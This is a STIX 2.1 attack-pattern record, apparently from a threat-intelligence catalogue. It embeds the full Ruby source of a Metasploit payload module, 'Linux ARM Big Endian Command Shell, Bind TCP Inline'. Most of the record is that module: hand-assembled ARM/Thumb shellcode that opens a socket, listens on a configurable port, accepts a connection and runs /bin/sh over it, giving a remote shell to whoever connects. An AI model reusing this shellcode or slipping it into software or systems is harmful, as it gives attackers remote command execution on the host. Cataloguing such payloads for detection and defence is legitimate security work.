{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d3f8aa54-1efc-45ee-a5b0-43b094714dec",
    "created": "2024-08-14T16:33:19.446506Z",
    "modified": "2024-08-14T16:33:19.44651Z",
    "name": "Linux ARM Big Endian Command Shell, Bind TCP Inline",
    "description": "Listen for a connection and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/armbe/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://github.com/earthquake/shellcodes/blob/master/armeb_linux_ipv4_bind_tcp.s"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 118\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux ARM Big Endian Command Shell, Bind TCP Inline',\n      'Description'   => 'Listen for a connection and spawn a command shell',\n      'Author'        => 'Balazs Bucsay @xoreipeip <balazs.bucsay[-at-]rycon[-dot-]hu>',\n      'References'    => [['URL', 'https://github.com/earthquake/shellcodes/blob/master/armeb_linux_ipv4_bind_tcp.s']],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_ARMBE,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix\n      ))\n    # Register command execution options\n    register_options(\n      [\n        OptString.new('CMD', [ true, \"The command to execute.\", \"/bin/sh\" ]),\n        Opt::LPORT(4444)\n      ])\n  end\n  def generate(_opts = {})\n    cmd = (datastore['CMD'] || '') + \"\\x00\"\n    bytehigh = (datastore['LPORT'].to_i >> 8).chr\n    bytelow = (datastore['LPORT'].to_i & 0xFF).chr\n\n    payload =\n            # turning on thumb mode\n            \"\\xe2\\x8f\\x60\\x01\"\t+ #\tadd \tr6, pc, #1\t#\n            \"\\xe1\\x2f\\xff\\x16\"\t+ #\tbx\tr6\t\t#\n\n            # thumb mode on\n            # socket(2,1,0)\n            \"\\x1a\\x92\"\t\t+ #\tsub\tr2, r2, r2\t#\n            \"\\x1c\\x51\"\t\t+ #\tadd\tr1, r2, #1\t#\n            \"\\x1c\\x90\"\t\t+ #\tadd\tr0, r2, #2\t#\n            \"\\x02\\x0f\"\t\t+ #\tlsl\tr7, r1, #8\t#\n            \"\\x37\\x19\"\t\t+ #\tadd\tr7, r7, #0x19\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc\t1\t\t#\n            \"\\x1c\\x06\"\t\t+ #\tmov\tr6, r0\t\t#\n\n            # bind()\n            \"\\x22\\x02\"\t\t+ #\tmov\tr2, #2\t\t#\n            \"\\x02\\x12\"\t\t+ #\tlsl\tr2, r2, #8\t#\n            \"\\x32\"+bytehigh\t+ #\tadd\tr2, r2, #0xXX\t#\n            \"\\x02\\x12\"\t\t+ #\tlsl\tr2, r2, #8\t#\n            \"\\x32\"+bytelow\t+ #\tadd\tr2, r2, #0xXX\t#\n            \"\\x1a\\xdb\"\t\t+ #\tsub\tr3, r3, r3\t#\n            \"\\x1b\\x24\"\t\t+ #\tsub\tr4, r4, r4\t#\n            \"\\x1b\\x6d\"\t\t+ #\tsub \tr5, r5, r5\t#\n            \"\\x46\\x69\"\t\t+ #\tmov\tr1, sp\t\t#\n            \"\\xc1\\x3c\"\t\t+ #\tstm\tr1!, {r2-r5}\t#\n            \"\\x39\\x10\"\t\t+ #\tsub\tr1, #0x10\t#\n            \"\\x22\\x10\"\t\t+ #\tmov\tr2, #16\t\t#\n            \"\\x37\\x01\"\t\t+ #\tadd\tr7, r7, #1\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc\t1\t\t#\n\n            # listen()\n            \"\\x1c\\x30\"\t\t+ #\tmov\tr0, r6\t\t#\n            \"\\x1a\\x49\"\t\t+ #\tsub\tr1, r1, r1\t#\n            \"\\x37\\x02\"\t\t+ #\tadd\tr7, r7, #2\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc\t1\t\t#\n\n            # accept()\n            \"\\x1c\\x30\"\t\t+ #\tmov\tr0, r6\t\t#\n            \"\\x1a\\x92\"\t\t+ #\tsub\tr2, r2, r2\t#\n            \"\\x37\\x01\"\t\t+ #\tadd\tr7, r7, #1\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc\t1\t\t#\n            \"\\x1c\\x06\"\t\t+ #\tmov\tr6, r0\t\t#\n\n            # dup2()\n            \"\\x1a\\x49\"\t\t+ #\tsub\tr1, r1, r1\t#\n            \"\\x27\\x3f\"\t\t+ #\tmov\tr7, #63\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc     1\t\t#\n            \"\\x1c\\x30\"\t\t+ #\tmov\tr0, r6\t#\n            \"\\x31\\x01\"\t\t+ #\tadd\tr1, r1, #1\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc     1\t\t#\n            \"\\x1c\\x30\"\t\t+ #\tmov\tr0, r6\t#\n            \"\\x31\\x01\"\t\t+ #\tadd\tr1, r1, #1\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc     1\t\t#\n\n            # execve()\n            \"\\x1a\\x92\"\t\t+ #\tsub\tr2, r2, r2\t#\n            \"\\x46\\x78\"\t\t+ #\tmov \tr0, pc\t\t#\n            \"\\x30\\x12\"\t\t+ #\tadd \tr0, #18\t\t#\n            \"\\x92\\x02\"\t\t+ #\tstr\tr2, [sp, #8]\t#\n            \"\\x90\\x01\"\t\t+ #\tstr\tr0, [sp, #4]\t#\n            \"\\xa9\\x01\"\t\t+ #\tadd \tr1, sp, #4\t#\n            \"\\x27\\x0b\"\t\t+ #\tmov \tr7, #11\t\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc \t1\t\t#\n\n            # exit()\n            \"\\x1b\\x24\"\t\t+ #\tsub\tr4, r4, r4\t#\n            \"\\x1c\\x20\"\t\t+ #\tmov\tr0, r4\t\t#\n            \"\\x27\\x01\"\t\t+ #\tmov \tr7, #1\t\t#\n            \"\\xdf\\x01\"\t\t+ #\tsvc \t1\t\t#\n            cmd\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}